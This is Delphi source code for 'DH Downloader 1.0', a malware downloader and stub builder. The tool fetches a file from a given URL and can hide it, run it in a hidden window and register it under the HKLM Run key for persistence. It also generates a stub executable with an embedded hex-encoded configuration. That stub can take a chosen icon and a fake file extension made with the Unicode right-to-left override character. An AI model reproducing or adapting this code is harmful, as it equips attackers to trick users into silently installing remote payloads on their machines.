// DH Downloader 1.0
// (C) Doddy Hackman 2015

unit down;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.Imaging.pngimage,
  Vcl.ExtCtrls, Vcl.ComCtrls, Registry, IdBaseComponent, IdComponent,
  IdTCPConnection, IdTCPClient, IdHTTP, ShellApi, StrUtils, MadRes;

type
  TForm1 = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    GroupBox1: TGroupBox;
    PageControl2: TPageControl;
    TabSheet4: TTabSheet;
    GroupBox3: TGroupBox;
    url: TEdit;
    TabSheet5: TTabSheet;
    GroupBox4: TGroupBox;
    save_with_this_name: TCheckBox;
    name: TEdit;
    save_directory: TCheckBox;
    TabSheet6: TTabSheet;
    GroupBox5: TGroupBox;
    show: TRadioButton;
    hide: TRadioButton;
    hide_file: TCheckBox;
    load_windows: TCheckBox;
    load_as: TCheckBox;
    GroupBox2: TGroupBox;
    Button1: TButton;
    TabSheet2: TTabSheet;
    GroupBox6: TGroupBox;
    PageControl3: TPageControl;
    TabSheet7: TTabSheet;
    GroupBox7: TGroupBox;
    link: TEdit;
    GroupBox8: TGroupBox;
    filename: TEdit;
    TabSheet8: TTabSheet;
    GroupBox9: TGroupBox;
    load_normal: TRadioButton;
    load_hide: TRadioButton;
    TabSheet9: TTabSheet;
    GroupBox10: TGroupBox;
    GroupBox11: TGroupBox;
    Button2: TButton;
    ruta_icono: TEdit;
    GroupBox16: TGroupBox;
    Button3: TButton;
    TabSheet3: TTabSheet;
    GroupBox15: TGroupBox;
    Memo1: TMemo;
    StatusBar1: TStatusBar;
    Image1: TImage;
    Image2: TImage;
    TabSheet11: TTabSheet;
    TabSheet12: TTabSheet;
    GroupBox18: TGroupBox;
    GroupBox19: TGroupBox;
    directorios: TComboBox;
    GroupBox20: TGroupBox;
    other_hide_file: TCheckBox;
    check_extension_changer: TCheckBox;
    GroupBox12: TGroupBox;
    check_extension: TCheckBox;
    extensiones: TComboBox;
    GroupBox13: TGroupBox;
    check_this_extension: TCheckBox;
    extension: TEdit;
    icon_changer: TCheckBox;
    GroupBox14: TGroupBox;
    preview: TImage;
    nave: TIdHTTP;
    directory: TComboBox;
    abrir_icono: TOpenDialog;
    procedure Button1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure nameDblClick(Sender: TObject);
    procedure filenameDblClick(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}
// Functions

procedure extension_changer(archivo: string; extension: string);
var
  nombre: string;
begin
  nombre := ExtractFileName(archivo);
  nombre := StringReplace(nombre, ExtractFileExt(nombre), '',
    [rfReplaceAll, rfIgnoreCase]);
  nombre := nombre + char(8238) + ReverseString('.' + extension) + '.exe';
  MoveFile(PChar(archivo), PChar(ExtractFilePath(archivo) + nombre));
end;

procedure cargar_archivo(archivo: TFileName; tipo: string);
var
  data: SHELLEXECUTEINFO;
begin
  if (FileExists(archivo)) then
  begin
    ZeroMemory(@data, SizeOf(SHELLEXECUTEINFO));
    data.cbSize := SizeOf(SHELLEXECUTEINFO);
    data.fMask := SEE_MASK_NOCLOSEPROCESS;
    data.Wnd := 0;
    data.lpVerb := 'open';
    data.lpFile := PChar(archivo);
    if (tipo = 'Show') then
    begin
      data.nShow := SW_SHOWNORMAL;
    end;
    if (tipo = 'Hide') then
    begin
      data.nShow := SW_HIDE;
    end;
    if not ShellExecuteEx(@data) then
      if GetLastError <= 32 then
      begin
        SysErrorMessage(GetLastError);
      end;
  end;
end;

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

function getfilename(archivo: string): string;
var
  test: TStrings;
begin

  test := TStringList.Create;
  test.Delimiter := '/';
  test.DelimitedText := archivo;
  Result := test[test.Count - 1];

  test.Free;

end;

//

procedure TForm1.Button1Click(Sender: TObject);
var
  filename: string;
  nombrefinal: string;
  addnow: TRegistry;
  archivobajado: TFileStream;
  directorio_final: string;
  dir: string;

begin

  if not save_with_this_name.Checked then
  begin
    filename := url.Text;
    nombrefinal := getfilename(filename);
  end
  else
  begin
    nombrefinal := name.Text;
  end;

  if save_directory.Checked then
  begin
    directorio_final := GetEnvironmentVariable(directory.Text);
  end
  else
  begin
    dir := GetCurrentDir;
    directorio_final := dir + '/';
  end;

  chdir(directorio_final);

  archivobajado := TFileStream.Create(nombrefinal, fmCreate);

  try
    begin
      DeleteFile(nombrefinal);
      nave.Get(url.Text, archivobajado);
      StatusBar1.Panels[0].Text := '[+] File Dowloaded';
      StatusBar1.Update;
      archivobajado.Free;
    end;
  except
    StatusBar1.Panels[0].Text := '[-] Failed download';
    StatusBar1.Update;
    archivobajado.Free;
    Abort;
  end;

  if FileExists(nombrefinal) then
  begin
    if hide_file.Checked then
    begin
      if save_directory.Checked then
      begin
        SetFileAttributes(PChar(directorio_final + '/' + nombrefinal),
          FILE_ATTRIBUTE_HIDDEN);

        StatusBar1.Panels[0].Text := '[+] File Hidden';
        StatusBar1.Update;
      end
      else
      begin
        SetFileAttributes(PChar(nombrefinal), FILE_ATTRIBUTE_HIDDEN);
        StatusBar1.Panels[0].Text := '[+] File Hidden';
        StatusBar1.Update;
      end;
    end;

    if load_windows.Checked then
    begin

      addnow := TRegistry.Create;
      addnow.RootKey := HKEY_LOCAL_MACHINE;
      addnow.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run', FALSE);

      if save_directory.Checked then
      begin
        addnow.WriteString('uber', directorio_final + '/' + nombrefinal);
      end
      else
      begin
        addnow.WriteString('uber', ExtractFilePath(Application.ExeName) + '/' +
          nombrefinal);
      end;

      StatusBar1.Panels[0].Text := '[+] Registry Updated';
      StatusBar1.Update;

      addnow.Free;

    end;

    if load_as.Checked then
    begin

      if show.Checked then
      begin
        if save_directory.Checked then
        begin
          cargar_archivo(directorio_final + '/' + nombrefinal, 'Show');
        end
        else
        begin
          cargar_archivo(nombrefinal, 'Show');
        end;
      end
      else
      begin
        if save_directory.Checked then
        begin
          cargar_archivo(directorio_final + '/' + nombrefinal, 'Hide');
        end
        else
        begin
          cargar_archivo(nombrefinal, 'Hide');
        end;
      end;
    end;

    if save_with_this_name.Checked or save_directory.Checked or
      hide_file.Checked or load_windows.Checked or load_as.Checked then
    begin
      StatusBar1.Panels[0].Text := '[+] Finished';
      StatusBar1.Update;
    end;

  end;
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
  if abrir_icono.Execute then
  begin
    preview.Picture.LoadFromFile(abrir_icono.filename);
    ruta_icono.Text := abrir_icono.filename;
  end;
end;

procedure TForm1.Button3Click(Sender: TObject);
var
  linea: string;
  aca: THandle;
  code: Array [0 .. 9999 + 1] of char;
  nose: DWORD;
  marca_uno: string;
  marca_dos: string;
  url: string;
  opcionocultar: string;
  savein: string;
  lineafinal: string;
  stubgenerado: string;
  tipodecarga: string;
  change: DWORD;
  valor: string;
  extensionacambiar: string;
  ruta_archivo: string;

begin

  url := link.Text;
  stubgenerado := 'tiny_down.exe';

  StatusBar1.Panels[0].Text := '[+] Working ...';
  StatusBar1.Update;

  if (load_hide.Checked = True) then
  begin
    tipodecarga := '1';
  end
  else
  begin
    tipodecarga := '0';
  end;

  if (other_hide_file.Checked = True) then
  begin
    opcionocultar := '1';
  end
  else
  begin
    opcionocultar := '0';
  end;

  savein := directorios.Text;

  lineafinal := '[link]' + url + '[link]' + '[opcion]' + opcionocultar +
    '[opcion]' + '[path]' + savein + '[path]' + '[name]' + filename.Text +
    '[name]' + '[carga]' + tipodecarga + '[carga]';

  marca_uno := '[63686175]' + dhencode(lineafinal, 'encode') + '[63686175]';

  aca := INVALID_HANDLE_VALUE;
  nose := 0;

  DeleteFile(stubgenerado);
  CopyFile(PChar(ExtractFilePath(Application.ExeName) + '/' +
    'Data/stub_down.exe'), PChar(ExtractFilePath(Application.ExeName) + '/' +
    stubgenerado), True);

  linea := marca_uno;
  StrCopy(code, PChar(linea));
  aca := CreateFile(PChar(stubgenerado), GENERIC_WRITE, FILE_SHARE_READ, nil,
    OPEN_EXISTING, 0, 0);
  if (aca <> INVALID_HANDLE_VALUE) then
  begin
    SetFilePointer(aca, 0, nil, FILE_END);
    WriteFile(aca, code, 9999, nose, nil);
    CloseHandle(aca);
  end;

  ruta_archivo := stubgenerado;

  if (icon_changer.Checked) then
  begin
    try
      begin
        change := BeginUpdateResourceW
          (PWideChar(wideString(ruta_archivo)), FALSE);
        LoadIconGroupResourceW(change, PWideChar(wideString(valor)), 0,
          PWideChar(wideString(ruta_icono.Text)));
        EndUpdateResourceW(change, FALSE);
      end;
    except
      begin
        //
      end;
    end;
  end;

  if (check_extension_changer.Checked) then
  begin
    if not(check_extension.Checked and check_this_extension.Checked) then
    begin
      if (check_extension.Checked) then
      begin
        extensionacambiar := extensiones.Items[extensiones.ItemIndex];
        extension_changer(ruta_archivo, extensionacambiar);
      end;
      if (check_this_extension.Checked) then
      begin
        extension_changer(ruta_archivo, extension.Text);
      end;
    end;
  end;

  StatusBar1.Panels[0].Text := '[+] Done';
  StatusBar1.Update;

end;

procedure TForm1.filenameDblClick(Sender: TObject);
begin
  if not(link.Text = '') then
  begin
    filename.Text := getfilename(link.Text);
  end;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  abrir_icono.InitialDir := GetCurrentDir;
  abrir_icono.Filter := 'ICO|*.ico|';
end;

procedure TForm1.nameDblClick(Sender: TObject);
begin
  if not(url.Text = '') then
  begin
    name.Text := getfilename(url.Text);
  end;
end;

end.

// The End ?
